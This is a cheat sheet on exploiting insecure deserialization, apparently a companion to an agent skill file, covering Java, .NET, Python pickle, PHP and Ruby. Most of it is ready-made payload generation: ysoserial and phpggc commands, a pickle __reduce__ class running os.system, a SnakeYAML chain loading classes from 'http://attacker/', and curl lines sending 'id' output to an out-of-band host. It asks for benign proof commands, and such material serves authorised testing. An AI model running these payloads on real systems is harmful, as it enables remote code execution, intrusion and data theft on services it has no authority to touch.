# Insecure deserialization cheat sheet

Companion to `SKILL.md`. First recognise the format from the blob, then pick the gadget tooling for
that stack. Prove RCE with a benign command (sleep/OOB); don't run destructive gadgets.

## Recognise the format (from the serialized blob)
```
rO0AB...            Java, base64 (magic 0xACED → "rO0" in b64).  Raw hex: AC ED 00 05
{"$type": ...}      .NET Json.NET with TypeNameHandling  →  ysoserial.net
AAEAAAD/////         .NET BinaryFormatter (base64)        →  ysoserial.net
gASV / \x80\x04      Python pickle (protocol 2-5)         →  handcraft __reduce__
a:2:{...}  O:4:...   PHP serialize()                      →  PHP POP chain / phpggc
BZh / gzip           may wrap any of the above — decompress first
----BEGIN...         Ruby Marshal (\x04\x08 prefix)        →  Ruby universal gadget
```

## Java
```
# find gadgets present on the classpath, then build a payload
ysoserial CommonsCollections6 'curl http://oob/$(id|base64)' | base64   # pick chain by libs
# common chains: CommonsCollections1-7, CommonsBeanutils1, Spring1/2, Groovy1, Hibernate1, JRMP
# detection: ysoserial URLDNS 'http://oob.tld'  → DNS hit proves deserialization even w/o a gadget
# entry points: Java serialized cookies/params, RMI, JMX, JNDI (log4shell-adjacent), T3 (WebLogic),
#   AMF, Kryo, XMLDecoder (<java><object class=...>), SnakeYAML !!javax.script...
```
SnakeYAML (YAML → Java): `!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker/"]]]]`

## .NET
```
ysoserial.exe -f Json.Net -g ObjectDataProvider -c "cmd /c calc" -o base64
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "cmd /c id" -o base64
# gadgets: ObjectDataProvider, TypeConfuseDelegate, WindowsIdentity, DataSet, ActivitySurrogate
# formats: BinaryFormatter, LosFormatter(ViewState), Json.Net, XmlSerializer, DataContract, SoapFormatter
# ViewState: ysoserial.exe -p ViewState -g ... --generator=<__VIEWSTATEGENERATOR> --validationkey=... (needs machineKey)
```

## Python (pickle)
```python
import pickle, base64, os
class E:
    def __reduce__(self): return (os.system, ("curl http://oob/$(id|base64)",))
print(base64.b64encode(pickle.dumps(E())).decode())
# also: PyYAML yaml.load (pre-safe): !!python/object/apply:os.system ["id"]
# jsonpickle, dill, numpy .npy(allow_pickle), shelve — same __reduce__ trick
```

## PHP
```
# generate a POP chain for a known framework/library with phpggc:
phpggc Laravel/RCE1 system id -b            # base64 output
phpggc Symfony/RCE4 system id -b
phpggc Monolog/RCE1 system id -b
# manual: find a class with __wakeup/__destruct/__toString that reaches a sink; craft O:...:{...}
# phar:// — deserialization via file ops on a crafted .phar (metadata is deserialized)
```

## Ruby
```
# universal Marshal RCE gadget (Ruby 2.x–3.x variants) — see the Elttam/ruby-deser writeups
# Marshal.load on user data; also Oj (compat mode), YAML.load (Psych) with !ruby/object
```

## Detection without a working gadget
```
Java URLDNS chain  → DNS callback proves the sink even if no exec gadget is present
timing/OOB         → use a sleep/callback command in the gadget, not a destructive one
error changes      → malformed blob that changes the response confirms it's being deserialized
```

## Verify
A DNS/HTTP callback or a measurable delay from your gadget. For a report, prove execution with a
benign command + the request; never run destructive payloads on a live target.

## References
ysoserial / ysoserial.net; phpggc; PayloadsAllTheThings (Insecure Deserialization); "Marshalling Pickles".
